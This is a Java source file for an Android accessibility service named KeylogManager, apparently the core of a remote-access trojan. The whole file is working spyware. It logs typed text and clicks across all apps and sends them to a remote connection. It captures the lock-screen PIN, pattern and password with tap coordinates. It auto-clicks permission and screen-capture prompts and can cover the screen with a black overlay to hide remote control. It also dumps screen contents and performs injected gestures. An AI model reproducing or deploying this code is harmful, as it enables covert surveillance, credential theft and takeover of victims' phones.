package com.Deviant.pro;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.KeyguardManager;
import android.content.Context;
import android.graphics.Color;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.FrameLayout;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public class KeylogManager extends AccessibilityService {

    private static final String TAG = "KeylogManager";

    // ✅ volatile — written on main thread, read from background threads
    private static volatile KeylogManager instance;

    // ✅ AtomicBoolean instead of plain static boolean
    private static final AtomicBoolean isReadingScreen = new AtomicBoolean(false);

    // ✅ Static final — reuse instead of allocating on every event
    private static final SimpleDateFormat TIME_FORMAT =
            new SimpleDateFormat("HH:mm:ss", Locale.getDefault());

    // ✅ Single-thread executor for dumpScreen — no unbounded thread spawning
    private final ExecutorService screenDumpExecutor =
            Executors.newSingleThreadExecutor(r -> {
                Thread t = new Thread(r, "screen-dump");
                t.setDaemon(true);
                return t;
            });

    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    private CommandProcessor commandProcessor;
    private WindowManager    windowManager;
    private FrameLayout      blackOverlay;
    private KeyguardManager  keyguardManager;

    // Harvester state — only accessed on the main/accessibility thread
    private final StringBuilder capturedPin      = new StringBuilder();
    private final StringBuilder capturedPattern  = new StringBuilder();
    private final StringBuilder capturedPassword = new StringBuilder();
    private boolean wasLocked = false;
    private final Map<String, String> coordMap = new HashMap<>();

    // -------------------------------------------------------------------------
    // Lifecycle
    // -------------------------------------------------------------------------

    public static KeylogManager getInstance() { return instance; }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance         = this;
        commandProcessor = new CommandProcessor(this);
        windowManager    = (WindowManager) getSystemService(WINDOW_SERVICE);
        keyguardManager  = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
        Log.d(TAG, "Accessibility service connected");

        try {
            JSONObject jo = new JSONObject();
            jo.put("type",    "accessibility_status");
            jo.put("enabled", true);
            ConnectionManager.send(jo.toString());
        } catch (Exception ignored) {}
    }

    @Override
    public void onInterrupt() {
        // Do NOT null instance here — service may recover from interruptions
        Log.w(TAG, "Accessibility service interrupted");
    }

    @Override
    public boolean onUnbind(android.content.Intent intent) {
        // Null instance only when fully unbound
        instance = null;
        screenDumpExecutor.shutdownNow();
        Log.d(TAG, "Accessibility service unbound");
        return super.onUnbind(intent);
    }

    // -------------------------------------------------------------------------
    // Public API
    // -------------------------------------------------------------------------

    public void processCommand(String command, String argument) {
        if (commandProcessor != null) {
            commandProcessor.process(command, argument);
        }
    }

    /**
     * Show or hide a black overlay over the screen.
     * Must run on the main thread — WindowManager requires it.
     */
    public void toggleBlackOverlay(boolean enable) {
        mainHandler.post(() -> {
            if (enable) {
                if (blackOverlay != null) return; // already shown
                blackOverlay = new FrameLayout(this);
                blackOverlay.setBackgroundColor(Color.BLACK);

                int type = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                        : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                | WindowManager.LayoutParams.FLAG_FULLSCREEN,
                        PixelFormat.TRANSLUCENT);
                params.gravity = Gravity.TOP;
                windowManager.addView(blackOverlay, params);

            } else {
                if (blackOverlay == null) return; // already hidden
                try {
                    windowManager.removeView(blackOverlay);
                } catch (Exception e) {
                    Log.e(TAG, "Error removing overlay: " + e.getMessage(), e);
                }
                blackOverlay = null;
            }
        });
    }

    public void startScreenReader() {
        isReadingScreen.set(true);
        dumpScreen();
    }

    public void stopScreenReader() {
        isReadingScreen.set(false);
    }

    public void performAction(int actionId) {
        performGlobalAction(actionId);
    }

    public void click(int x, int y) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Path path = new Path();
            path.moveTo(x, y);
            GestureDescription gesture = new GestureDescription.Builder()
                    .addStroke(new GestureDescription.StrokeDescription(path, 0, 100))
                    .build();
            dispatchGesture(gesture, null, null);
        }
    }

    public void swipe(int x1, int y1, int x2, int y2, int duration) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Path path = new Path();
            path.moveTo(x1, y1);
            path.lineTo(x2, y2);
            GestureDescription gesture = new GestureDescription.Builder()
                    .addStroke(new GestureDescription.StrokeDescription(path, 0, duration))
                    .build();
            dispatchGesture(gesture, null, null);
        }
    }

    // -------------------------------------------------------------------------
    // Accessibility event handler
    // -------------------------------------------------------------------------

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            boolean isLocked = keyguardManager != null
                    && keyguardManager.isKeyguardLocked();

            // Detect unlock
            if (wasLocked && !isLocked) reportUnlockSuccess();
            wasLocked = isLocked;

            if (isLocked) harvestLockScreen(event);

            int eventType = event.getEventType();

            // Auto-grant permission dialogs
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                    || eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

                String pkg = event.getPackageName() != null
                        ? event.getPackageName().toString() : "";

                if (pkg.equals("com.android.systemui")
                        || pkg.contains("settings")
                        || pkg.contains("packageinstaller")) {
                    autoClickStartNow();
                }

                // Screen reader — submit to executor, not new Thread each time
                if (isReadingScreen.get()) {
                    dumpScreen();
                }
            }

            // Keylogger
            String pkg       = event.getPackageName() != null
                    ? event.getPackageName().toString() : "Unknown";
            String eventData = "";

            switch (eventType) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    if (event.getText() != null && !event.getText().isEmpty()) {
                        eventData = event.getText().toString();
                    }
                    break;
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    if (event.getText() != null && !event.getText().isEmpty()) {
                        eventData = "[Clicked: " + event.getText() + "]";
                    }
                    break;
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    if (event.getText() != null && !event.getText().isEmpty()) {
                        eventData = "[Focused: " + event.getText() + "]";
                    }
                    break;
            }

            if (!eventData.isEmpty()) {
                JSONObject jo = new JSONObject();
                jo.put("type", "keylog");
                jo.put("app",  pkg);
                jo.put("data", eventData);
                jo.put("time", TIME_FORMAT.format(new Date()));
                ConnectionManager.send(jo.toString());
            }

        } catch (Exception e) {
            Log.e(TAG, "Accessibility event error: " + e.getMessage(), e);
        }
    }

    // -------------------------------------------------------------------------
    // Lock screen harvester
    // -------------------------------------------------------------------------

    private void harvestLockScreen(AccessibilityEvent event) {
        int type = event.getEventType();
        if (type != AccessibilityEvent.TYPE_VIEW_CLICKED
                && type != AccessibilityEvent.TYPE_VIEW_FOCUSED
                && type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return;

        AccessibilityNodeInfo source = event.getSource();
        if (source == null) return;

        // ✅ Always recycle source node
        try {
            String resId = source.getViewIdResourceName();
            if (resId == null) return;

            Rect bounds = new Rect();
            source.getBoundsInScreen(bounds);
            String coords = bounds.centerX() + "," + bounds.centerY();

            // PIN
            if (resId.contains("com.android.systemui:id/key")) {
                String key = resId.substring(resId.lastIndexOf("key") + 3);
                if (key.matches("\\d")) {
                    capturedPin.append(key);
                    coordMap.put("PIN_" + key, coords);
                } else if (key.equals("_enter") || key.equals("_ok")) {
                    capturedPin.append("[E]");
                    coordMap.put("PIN_ENTER", coords);
                }
            }

            // Pattern
            if (resId.contains("lockPatternView")) {
                CharSequence desc = source.getContentDescription();
                if (desc != null) {
                    String cell = desc.toString();
                    if (!capturedPattern.toString().contains(cell)) {
                        capturedPattern.append(cell).append(" ");
                        coordMap.put("PT_" + cell, coords);
                    }
                }
            }

            // Password — TYPE_VIEW_TEXT_CHANGED; getText() returns List<CharSequence>
            if (resId.contains("passwordEntry") || resId.contains("miui_mixed_password")) {
                if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                    List<CharSequence> texts = event.getText();
                    if (texts != null && !texts.isEmpty()) {
                        // ✅ getText() is a List — join properly, not via List.toString()
                        StringBuilder sb = new StringBuilder();
                        for (CharSequence cs : texts) sb.append(cs);
                        capturedPassword.setLength(0);
                        capturedPassword.append(sb);
                    }
                }
            }

        } finally {
            source.recycle(); // ✅ Always recycled
        }
    }

    private void reportUnlockSuccess() {
        try {
            String pin      = capturedPin.toString();
            String pattern  = capturedPattern.toString().trim();
            String password = capturedPassword.toString();

            if (pin.isEmpty() && pattern.isEmpty() && password.isEmpty()) return;

            JSONObject coords = new JSONObject();
            for (Map.Entry<String, String> e : coordMap.entrySet()) {
                coords.put(e.getKey(), e.getValue());
            }

            JSONObject jo = new JSONObject();
            jo.put("type",     "lock_captured");
            jo.put("pin",      pin);
            jo.put("pattern",  pattern);
            jo.put("password", password);
            jo.put("coords",   coords);
            ConnectionManager.send(jo.toString());

        } catch (Exception e) {
            Log.e(TAG, "reportUnlockSuccess error: " + e.getMessage(), e);
        } finally {
            // ✅ Reset state whether send succeeded or not
            capturedPin.setLength(0);
            capturedPattern.setLength(0);
            capturedPassword.setLength(0);
            coordMap.clear();
        }
    }

    // -------------------------------------------------------------------------
    // Auto-grant helper
    // -------------------------------------------------------------------------

    private void autoClickStartNow() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        try {
            String[] targets = {
                "Start now", "START NOW", "Allow", "ALLOW",
                "Inizializza ora", "Comenzar ahora", "Commencer"
            };

            for (String target : targets) {
                List<AccessibilityNodeInfo> nodes =
                        root.findAccessibilityNodeInfosByText(target);
                if (nodes == null) continue;

                try {
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node == null) continue;
                        try {
                            if (node.isClickable()) {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                Log.d(TAG, "Auto-clicked: " + target);
                                return; // Done — exit all loops
                            }
                        } finally {
                            node.recycle(); // 
                        }
                    }
                } finally {
                    // List itself doesn't need recycling — individual nodes do (above)
                }
            }
        } finally {
            root.recycle(); //
        }
    }

    // -------------------------------------------------------------------------
    // Screen reader / node dumper
    // -------------------------------------------------------------------------

    /**
     * Submit a screen dump task to the single-thread executor.
     * ✅ Replaces new Thread() on every event — prevents thread explosion.
     */
    private void dumpScreen() {
        screenDumpExecutor.submit(() -> {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;

            try {
                JSONArray nodes = new JSONArray();
                processNode(root, nodes);

                JSONObject jo = new JSONObject();
                jo.put("type",  "screen_reader");
                jo.put("nodes", nodes);
                ConnectionManager.send(jo.toString());

            } catch (Exception e) {
                Log.e(TAG, "Dump screen error: " + e.getMessage(), e);
            } finally {
                root.recycle(); // ✅ Always recycled
            }
        });
    }

    /**
     * Recursively traverse the node tree, recycling every child after visiting.
     */
    private void processNode(AccessibilityNodeInfo node, JSONArray result) {
        if (node == null) return;

        try {
            Rect bounds = new Rect();
            node.getBoundsInScreen(bounds);

            CharSequence text        = node.getText();
            CharSequence contentDesc = node.getContentDescription();
            CharSequence className   = node.getClassName();

            String textStr = text        != null ? text.toString()        : "";
            String descStr = contentDesc != null ? contentDesc.toString() : "";
            String clsStr  = className   != null ? className.toString()   : "";

            // Only emit nodes that carry useful information
            if (!textStr.isEmpty() || !descStr.isEmpty() || node.isClickable()) {
                JSONObject jo = new JSONObject();
                jo.put("t",  textStr);
                jo.put("c",  descStr);
                jo.put("cl", clsStr);
                jo.put("b",  bounds.left + "," + bounds.top
                        + "," + bounds.right + "," + bounds.bottom);
                jo.put("ck", node.isClickable());
                result.put(jo);
            }

            // Recurse into children, recycling each after visit
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child == null) continue;
                try {
                    processNode(child, result);
                } finally {
                    child.recycle(); 
                }
            }

        } catch (Exception e) {
            Log.w(TAG, "processNode error: " + e.getMessage());
        }
    }
}
